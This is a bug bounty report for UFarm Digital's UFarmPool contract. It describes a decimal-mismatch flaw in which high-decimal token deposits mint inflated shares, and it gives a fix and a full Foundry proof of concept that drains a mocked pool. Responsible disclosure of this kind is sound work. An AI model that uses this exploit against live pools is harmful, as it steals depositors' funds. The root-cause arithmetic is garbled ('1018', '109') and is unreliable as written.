## Decimal Mismatch in UFarmPool Allows Liquidity Draining via High-Decimal Token Deposits

### Report ID	d1386f77-6c1e-4e3f-8294-94d9e8c8a182
### Submission Date	November 28, 2025 03:56:18 PM
### Program Name:	UFarm Digital

### Severity: Critical
Link to the Repository: https://github.com/UFarmDigital/UFarm-EVM-Contracts/blob/master/contracts/main/contracts/pool/UFarmPool.sol

### Platform: Remedy (hunt.r.xyz)

## Summary
A critical vulnerability exists in the UFarmPool contract where share calculation logic fails to normalize token decimals. When users deposit high-decimal tokens (e.g., DAI, 18 decimals) into low-decimal pools (e.g., USDT, 6 decimals), the protocol erroneously treats raw amounts as equivalent value. This mints inflated shares (e.g., 1 trillion shares for a $1 deposit), allowing attackers to drain the pool's assets.

## Vulnerability Analysis
### The Buggy Code
The vulnerability resides in UFarmPool.sol's quexCallback function. This function processes pending deposits after receiving a total value update from the Oracle.

File: contracts/main/contracts/pool/UFarmPool.sol

```solidity
function quexCallback(uint256 receivedRequestId, DataItem memory response) external {
    // ... [checks] ...
    
    // 1. Oracle updates totalCost (Value of pool in ValueToken, e.g., USDT/6 decimals)
    _totalCost = abi.decode(response.value, (uint256));

    // ... [fee accrual] ...

    // DEPOSITS PROCESSING
    {
        // ...
        for (uint256 i = 0; i < queueLength; i++) {
            depositItem = depositQueue[i];
            amountToInvest = depositItem.amount; // RAW AMOUNT (e.g., 1e18 for 1 DAI)
            investor = depositItem.investor;
            // ...

            if (__usedDepositsRequests[depositRequestHash] == false) {
                // VULNERABILITY HERE:
                // amountToInvest is passed RAW. If it is 18 decimals (DAI) and 
                // _totalCost/totalSupply are 6 decimals (USDT pool), the numerator explodes.
                sharesToMint = _sharesByQuote(amountToInvest, totalSupply(), _totalCost); 
                
                if (sharesToMint < depositItem.minOutputAmount) continue;

                try this.safeTransferToPool(investor, amountToInvest, depositItem.bearerToken) {
                    _mintShares(investor, sharesToMint);
                    // ...
                } 
                // ...
            }
        }
        // ...
    }
}
```

the helpers:
```solidity
// Helper function involved
function _sharesByQuote(
    uint256 quoteAmount,
    uint256 _totalSupply,
    uint256 totalCost
) internal pure returns (uint256 shares) {
    // Formula: (InvestmentValue * TotalSupply) / CurrentPoolValue
    shares = (totalCost > 0 && _totalSupply > 0) ? ((quoteAmount * _totalSupply) / totalCost) : quoteAmount;
}
```
## Root Cause

The _sharesByQuote function incorrectly assumes quoteAmount (deposit) and totalCost (TVL) share the same decimal precision.

However, UFarmPool supports multi-token deposits via depositForToken. If the pool's base asset (valueToken) is USDT (6 decimals) and a user deposits DAI (18 decimals):

Pool State: _totalCost = 1,000 USDT (1,000,000,000 raw units). totalSupply = 1,000 shares.

Attack Deposit: 1 DAI (1,000,000,000,000,000,000 raw units).

Calculation:

shares = (1018 * 1000) / 109

Result:
The attacker deposits $1 but receives 1 Trillion shares, effectively owning 99.999% of the pool.

Attack Scenario
- Setup: A UFarmPool exists with USDT (6 decimals) as the valueToken. It holds $1,000 in liquidity.

- Action: Attacker calls depositForToken with 1 DAI (1e18).

- Execution: quexCallback executes. The contract transfers 1 DAI from the attacker but calculates shares using the 1e18 raw value against the 1e6 pool value.

- Outcome: Attacker is minted shares equivalent to depositing $1,000,000,000,000 USDT.

- Drain: Attacker calls withdraw for their shares. Holding the vast majority of supply, the attacker withdraws nearly all pool assets (initial $1,000 USDT + 1 DAI).

## Recommended Fix
To fix this, the deposit amount must be normalized to the pool's precision (__decimals) before being used in the share calculation formula. The transfer logic must still use the raw amount.

We introduce a _normalizeAmount helper and apply it in quexCallback.

Optimal Code Fix

In UFarmPool.sol:

Add Helper Function:
```solidity
/**
 * @notice Normalizes an amount from a token's decimals to the pool's decimals
 */
function _normalizeAmount(uint256 amount, address token) internal view returns (uint256) {
    uint8 tokenDecimals = ERC20(token).decimals();
    uint8 poolDecimals = decimals(); // This pool's decimals (from valueToken)

    if (tokenDecimals == poolDecimals) {
        return amount;
    } else if (tokenDecimals > poolDecimals) {
        return amount / (10 ** (tokenDecimals - poolDecimals));
    } else {
        return amount * (10 ** (poolDecimals - tokenDecimals));
    }
}
```
Update quexCallback:

```solidity
function quexCallback(uint256 receivedRequestId, DataItem memory response) external {
    // ... [existing code] ...

    // DEPOSITS
    {
        uint256 sharesToMint;
        uint256 amountToInvest;
        uint256 normalizedAmount; // NEW VARIABLE
        // ...

        for (uint256 i = 0; i < queueLength; i++) {
            depositItem = depositQueue[i];
            amountToInvest = depositItem.amount; // Keep raw for transfer
            investor = depositItem.investor;
            depositRequestHash = depositItem.requestHash;

            if (__usedDepositsRequests[depositRequestHash] == false) {
                // FIX: Normalize amount before share calculation
                normalizedAmount = _normalizeAmount(amountToInvest, depositItem.bearerToken);

                sharesToMint = _sharesByQuote(normalizedAmount, totalSupply(), _totalCost);

                if (sharesToMint < depositItem.minOutputAmount) continue;

                try this.safeTransferToPool(investor, amountToInvest, depositItem.bearerToken) {
                    _mintShares(investor, sharesToMint);

                    // Adjust total cost using normalized amount (value)
                    _totalCost += normalizedAmount; 
                    totalDeposit += normalizedAmount; 

                    // ... [events] ...
                } 
                // ...
            }
        }
        // ...
    }
    // ...
}
```

Note: Ensure _totalCost updates use normalizedAmount to prevent corrupting the pool's TVL accounting with mixed units. The fix above addresses both the share calculation and the TVL update.

PoC
Create a new foundry test directory and initialize foundry project in the repo root.

delete src and create new foundry-test/test/DecimalMismatchVulnerability.t.sol
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";

// Contract Imports
import {UFarmPool} from "contracts/main/contracts/pool/UFarmPool.sol";
import {IUFarmPool} from "contracts/main/contracts/pool/IUFarmPool.sol";
import {PoolAdmin} from "contracts/main/contracts/pool/PoolAdmin.sol";
import {UFarmCore} from "contracts/main/contracts/core/UFarmCore.sol";
import {UFarmFund} from "contracts/main/contracts/fund/UFarmFund.sol";
import {IUFarmFund} from "contracts/main/contracts/fund/IUFarmFund.sol";
import {FundFactory} from "contracts/main/contracts/fund/FundFactory.sol";
import {PoolFactory} from "contracts/main/contracts/pool/PoolFactory.sol";
import {PriceOracle} from "contracts/main/contracts/oracle/PriceOracle.sol";
import {UFarmPermissionsModel} from "contracts/main/contracts/permissions/UFarmPermissionsModel.sol";
import {Permissions} from "contracts/main/contracts/permissions/Permissions.sol";

// Test Mocks
import {StableCoin} from "contracts/test/StableCoin.sol";
import {QuexCore} from "contracts/test/Quex/QuexCore.sol";
import {QuexPool} from "contracts/test/Quex/QuexPool.sol";

contract DecimalMismatchVulnerabilityTest is Test {
    // Contracts
    UFarmPool public pool;
    PoolAdmin public poolAdmin;
    UFarmCore public ufarmCore;
    UFarmFund public ufarmFund;
    FundFactory public fundFactory;
    PoolFactory public poolFactory;
    PriceOracle public priceOracle;
    QuexCore public quexCore;
    QuexPool public quexPool;

    // Assets
    StableCoin public usdt; // 6 decimals
    StableCoin public dai;  // 18 decimals

    // Users
    uint256 public alicePk = 0xA11CE;
    address public alice = vm.addr(0xA11CE);

    uint256 public bobPk = 0xB0B;
    address public bob = vm.addr(0xB0B);
    
    address public deployer = address(this);

    // EIP-712 TypeHash
    bytes32 constant WITHDRAW_REQUEST_TYPEHASH = keccak256("WithdrawRequest(uint256 sharesToBurn,bytes32 salt,address poolAddr,uint256 minOutputAmount)");
    
    function setUp() public {
        usdt = new StableCoin("USDT", "USDT", 6);
        dai = new StableCoin("DAI", "DAI", 18);

        usdt.mint(alice, 1000e6);
        dai.mint(bob, 1e18);

        quexCore = new QuexCore();
        quexPool = new QuexPool();
        
        UpgradeableBeacon fundBeacon = new UpgradeableBeacon(address(new UFarmFund()));
        UpgradeableBeacon poolBeacon = new UpgradeableBeacon(address(new UFarmPool()));
        UpgradeableBeacon poolAdminBeacon = new UpgradeableBeacon(address(new PoolAdmin()));
        
        UFarmCore coreImpl = new UFarmCore();
        PriceOracle oracleImpl = new PriceOracle();

        ERC1967Proxy coreProxy = new ERC1967Proxy(address(coreImpl), "");
        ERC1967Proxy oracleProxy = new ERC1967Proxy(address(oracleImpl), "");

        ufarmCore = UFarmCore(address(coreProxy));
        priceOracle = PriceOracle(address(oracleProxy));

        fundFactory = new FundFactory(address(ufarmCore), address(fundBeacon));
        poolFactory = new PoolFactory(address(ufarmCore), address(poolBeacon), address(poolAdminBeacon));

        priceOracle.__init__PriceOracle(address(ufarmCore), address(quexCore));
        ufarmCore.__init__UFarmCore(deployer, address(fundFactory), address(poolFactory), address(priceOracle));

        vm.mockCall(address(ufarmCore), abi.encodeWithSelector(bytes4(keccak256("isTokenWhitelisted(address)")), address(usdt)), abi.encode(true));
        vm.mockCall(address(ufarmCore), abi.encodeWithSelector(bytes4(keccak256("isValueTokenWhitelisted(address)")), address(usdt)), abi.encode(true));
        vm.mockCall(address(ufarmCore), abi.encodeWithSelector(bytes4(keccak256("isValueTokenWhitelisted(address)")), address(dai)), abi.encode(true));

        address fundAddr = ufarmCore.createFund(deployer, keccak256("FundSalt"));
        ufarmFund = UFarmFund(payable(fundAddr));

        // mock KYC & Activate Fund
        vm.mockCall(address(ufarmFund), abi.encodeWithSelector(UFarmPermissionsModel.checkForPermissionsMask.selector), abi.encode());
        ufarmFund.changeStatus(IUFarmFund.FundStatus.Active);

        // create pool
        IUFarmPool.CreationSettings memory params;
        params.minInvestment = 1;
        params.maxInvestment = 1e24;
        params.valueToken = address(usdt);
        params.name = "UFarmPool";
        params.symbol = "POOL";

        (address poolAddr, address poolAdminAddr) = ufarmFund.createPool(params, keccak256("PoolSalt"));
        pool = UFarmPool(payable(poolAddr));
        poolAdmin = PoolAdmin(poolAdminAddr);

        pool.setMinClientTier(0);

        // activate Pool
        vm.prank(poolAdminAddr);
        pool.changeStatus(IUFarmPool.PoolStatus.Active);
    }

    function test_Exploit_DecimalMismatch() public {

        // alice Deposits 1,000 USDT (Honest User)
        vm.startPrank(alice);
        usdt.approve(address(pool), 1000e6);
        pool.deposit(1000e6, _emptyVerification());
        vm.stopPrank();

        quexCore.sendResponse(address(pool), 1000e6); // Value = $1000

        // Bob Attacks with 1 DAI
        vm.startPrank(bob);
        dai.approve(address(pool), 1e18);
        pool.depositForToken(1e18, _emptyVerification(), address(dai));
        vm.stopPrank();

        // Oracle Callback before Bob's deposit processes
        quexCore.sendResponse(address(pool), 1000e6); 

        uint256 bobShares = pool.balanceOf(bob);
        uint256 aliceShares = pool.balanceOf(alice);

        console.log("Alice Shares (Deposited 1000e6):", aliceShares);
        console.log("Bob Shares (Deposited 1e18):   ", bobShares);

        // Bob gets ~1 Trillion shares for $1
        assertGe(bobShares, aliceShares * 1_000_000_000, "Bob should have >= 1 billion x Alice's shares");

        // Bob Withdraws Everything

        bytes32 salt = keccak256("hack");
        IUFarmPool.WithdrawRequest memory reqBody = IUFarmPool.WithdrawRequest({
            sharesToBurn: bobShares,
            minOutputAmount: 0,
            salt: salt,
            poolAddr: address(pool)
        });

        bytes memory signature = _signWithdrawal(bobPk, reqBody);
        IUFarmPool.SignedWithdrawalRequest memory signedReq = IUFarmPool.SignedWithdrawalRequest({
            body: reqBody,
            signature: signature
        });

        vm.startPrank(bob);
        pool.withdraw(signedReq);
        vm.stopPrank();

        // Oracle Callback
        // set value to 1000e6 (matches available USDT liquidity)
        quexCore.sendResponse(address(pool), 1000e6);

        // Verify Drain
        uint256 bobUsdtBalance = usdt.balanceOf(bob);
        uint256 poolUsdtBalance = usdt.balanceOf(address(pool));

        console.log("Bob USDT Balance:", bobUsdtBalance);
        console.log("Pool USDT Remaining:", poolUsdtBalance);
        
        assertApproxEqAbs(bobUsdtBalance, 1000e6, 1e6, "Bob should have stolen ~1000 USDT"); 
        assertLt(poolUsdtBalance, 1e6, "Pool should be drained");
    }

    function _signWithdrawal(uint256 pk, IUFarmPool.WithdrawRequest memory req) internal view returns (bytes memory) {
        bytes32 domainSeparator = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("UFarm-UFarmPool")), 
                keccak256(bytes("1.0")), 
                block.chainid,
                address(pool)
            )
        );

        bytes32 structHash = keccak256(
            abi.encode(
                WITHDRAW_REQUEST_TYPEHASH, 
                req.sharesToBurn, 
                req.salt, 
                req.poolAddr, 
                req.minOutputAmount
            )
        );

        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    function _emptyVerification() internal pure returns (IUFarmPool.ClientVerification memory) {
        return IUFarmPool.ClientVerification({
            tier: 0,
            validTill: 0,
            signature: ""
        });
    }
}
```

foundry.toml

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib", "../node_modules"]
test = "test"
cache_path = "cache"
solc_version = "0.8.24"
allow_paths = ["../contracts", "../node_modules"]
remappings = [
 "@openzeppelin/=../node_modules/@openzeppelin/",
 "@uniswap/=../node_modules/@uniswap/",
 "@chainlink/=../node_modules/@chainlink/",
 "ds-test/=../node_modules/ds-test/",
 "contracts/=../contracts/",
]
optimizer = true
optimizer_runs = 200

```
Install hte node dependencies forge test
